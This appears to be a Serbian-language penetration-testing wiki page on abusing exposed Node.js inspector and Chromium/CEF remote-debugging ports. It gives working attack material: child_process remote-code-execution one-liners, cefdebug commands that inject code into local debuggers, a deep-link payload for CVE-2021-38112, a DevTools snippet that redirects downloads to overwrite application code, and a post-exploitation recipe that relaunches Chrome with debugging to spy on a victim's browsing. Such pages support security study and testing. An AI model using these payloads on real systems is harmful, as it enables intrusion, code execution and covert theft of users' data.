# Zloupotreba Node inspector/CEF debug-a

Istorijski praktični primeri obuhvataju Multimaster walkthrough i CVE-2019-1414 Visual Studio Code debugger attack; koristite ih kao kontekst specifičan za određene verzije, umesto pretpostavke da svaki aktuelni Electron ili Chromium target izlaže iste primitive.<sup>[[1]](#references)[[3]](#references)</sup>

## Osnovne informacije

[Prema dokumentaciji](https://nodejs.org/learn/getting-started/debugging): Kada se pokrene sa `--inspect` switch-om, Node.js proces osluškuje debugging client. **Podrazumevano**, osluškivaće na host-u i portu **`127.0.0.1:9229`**. Svakom procesu se takođe dodeljuje **jedinstveni** **UUID**.<sup>[[4]](#references)</sup>

Inspector clients moraju znati i navesti adresu host-a, port i UUID da bi se povezali. Puni URL izgleda otprilike ovako: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Pošto **debugger ima potpun pristup Node.js execution environment-u**, malicious actor koji može da se poveže na ovaj port može biti u mogućnosti da izvrši proizvoljan kod u ime Node.js procesa (**potencijalna eskalacija privilegija**).<sup>[[4]](#references)</sup>

Postoji nekoliko načina za pokretanje inspectora:<sup>[[4]](#references)</sup>
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Kada pokrenete proces koji se inspektuje, pojaviće se nešto poput ovoga:<sup>[[4]](#references)</sup>
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Procesi zasnovani na **CEF** (**Chromium Embedded Framework**) mogu da izlože debugger pomoću `--remote-debugging-port=9222`. Ovo izlaže browser putem [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), a ne putem Node.js inspectora, tako da Node.js payload-i zasnovani na `process` podrazumevano nisu direktno primenljivi.<sup>[[2]](#references)[[5]](#references)</sup>

Kada pokrenete browser sa uključenim debagovanjem, pojaviće se nešto poput sledećeg:<sup>[[2]](#references)[[5]](#references)</sup>
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Browseri, WebSockets i same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Veb-sajtovi otvoreni u web-browseru mogu da šalju WebSocket i HTTP zahteve u okviru bezbednosnog modela browsera. **Početna HTTP konekcija** je neophodna za **dobijanje jedinstvenog debugger session id-ja**. **Same-origin-policy** **sprečava** veb-sajtove da uspostave **ovu HTTP konekciju**. Kao dodatnu zaštitu od [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js proverava da **'Host' headeri** za konekciju navode ili **IP adresu** ili tačno **`localhost`**.<sup>[[4]](#references)</sup>

> [!TIP]
> Ova **bezbednosna mera sprečava iskorišćavanje inspectora** za pokretanje koda **samo slanjem HTTP zahteva** (što bi moglo da se uradi iskorišćavanjem SSRF vuln-a).<sup>[[4]](#references)</sup>

### Pokretanje inspectora u procesima koji rade

Možete poslati **signal SIGUSR1** procesu nodejs koji radi kako biste naterali da **pokrene inspector** na podrazumevanom portu. Međutim, imajte na umu da morate imati dovoljno privilegija, pa vam to može omogućiti **privileged access do informacija unutar procesa**, ali ne i direktnu privilege escalation.<sup>[[4]](#references)</sup>
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Ovo je korisno u containerima zato što **gašenje procesa i pokretanje novog** sa `--inspect` **nije opcija**, jer će **container** biti **ugašen** zajedno sa procesom.<sup>[[6]](#references)</sup>

### Povezivanje sa inspector/debuggerom

Da biste se povezali sa **Chromium-based browserom**, URL-ovima `chrome://inspect` ili `edge://inspect` može se pristupiti za Chrome odnosno Edge. Klikom na dugme Configure treba proveriti da li su **ciljni host i port** ispravno navedeni. Slika prikazuje primer Remote Code Execution (RCE):<sup>[[2]](#references)[[4]](#references)</sup>

![Nakon toga će se pojaviti URL za pristup debuggeru, npr. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Povezivanje sa inspector/debuggerom: Da biste se povezali sa Chromium-based browserom,...](<../../images/image (674).png>)

Korišćenjem **komandne linije** možete se povezati sa debuggerom/inspectorom pomoću:<sup>[[2]](#references)[[4]](#references)</sup>
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Alat [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) omogućava **pronalaženje inspectora** pokrenutih lokalno i **ubacivanje koda** u njih.<sup>[[2]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> Imajte na umu da **NodeJS RCE exploits neće raditi** ako ste povezani sa browserom putem [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (potrebno je proveriti API da biste pronašli zanimljive načine njegove upotrebe).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE u NodeJS Debugger/Inspector

> [!TIP]
> Ako ste došli ovde tražeći način da dobijete [**RCE from a XSS in Electron pogledajte ovu stranicu.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Neki uobičajeni načini za dobijanje **RCE** kada možete da se **connect** na Node **inspector** jeste korišćenje nečega poput sledećeg (izgleda da ovo **won't work in a connection to Chrome DevTools protocol**):<sup>[[2]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

API možete proveriti ovde: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
U ovom odeljku ću samo navesti zanimljive stvari za koje sam pronašao da su ih ljudi koristili za exploit ovog protokola.

### Parameter Injection via Deep Links

U [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) kompanija Rhino security otkrila je da je aplikacija zasnovana na CEF-u **registrovala prilagođeni UR**I u sistemu (workspaces://index.html), koji je primao puni URI, a zatim **pokretala aplikaciju zasnovanu na CEF-u**n sa konfiguracijom koja je delimično konstruisana na osnovu tog URI-ja.<sup>[[8]](#references)</sup>

Otkriveno je da su URI parametri URL decoded i korišćeni za pokretanje osnovne CEF aplikacije, što je korisniku omogućilo da **injectuje** flag **`--gpu-launcher`** u **command line** i izvršava proizvoljne radnje.<sup>[[8]](#references)</sup>

Dakle, payload kao što je:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Izvršiće `calc.exe`.<sup>[[8]](#references)</sup>

### Prepisivanje datoteka

Promenite fasciklu u koju će se **preuzete datoteke čuvati** i preuzmite datoteku kako biste **prepisali** često korišćeni **izvorni kôd** aplikacije svojim **zlonamernim kôdom**.<sup>[[5]](#references)[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE i eksfiltracija

STAR Labs je pokazao da izložene WebDriver/CDP usluge mogu omogućiti proizvoljno čitanje datoteka i RCE; DNS rebinding u nekim konfiguracijama može dovršiti exploit chain.<sup>[[9]](#references)</sup>

Za dodatne istorijske slučajeve browser automation-a i Chromium security problema pogledajte Counter WebDriver write-up i Project Zero probleme 773, 1742 i 1944.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Post-Exploitation

U stvarnom okruženju, **nakon kompromitovanja** korisničkog računara koji koristi browser zasnovan na Chrome/Chromium-u, mogli biste pokrenuti Chrome proces sa **aktiviranim debugging-om i proslediti debugging port** kako biste mu pristupili. Na ovaj način moći ćete da **nadgledate sve što žrtva radi u Chrome-u i ukradete osetljive informacije**.<sup>[[7]](#references)</sup>

Stealth način je da **terminirate svaki Chrome proces**, a zatim pozovete nešto poput:<sup>[[7]](#references)</sup>
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - alat za inspekciju i exploitation CEF/Chromium debuggera](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Daljinsko izvršavanje koda u Visual Studio Code-u putem Chrome DevTools Debuggera](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Vodič za Node.js debugging - početak](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [Izveštaj o corCTF 2021 - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Zloupotreba Chrome-ove debugging funkcije za daljinsko posmatranje i kontrolu sesija pregledanja](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: Daljinsko izvršavanje koda u AWS WorkSpaces](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [You Talking To Me? - WebDriver RCE putem DNS rebindinga i CDP-a (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter WebDriver - Od bota do RCE-a](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
{{#include ../../banners/hacktricks-training.md}}
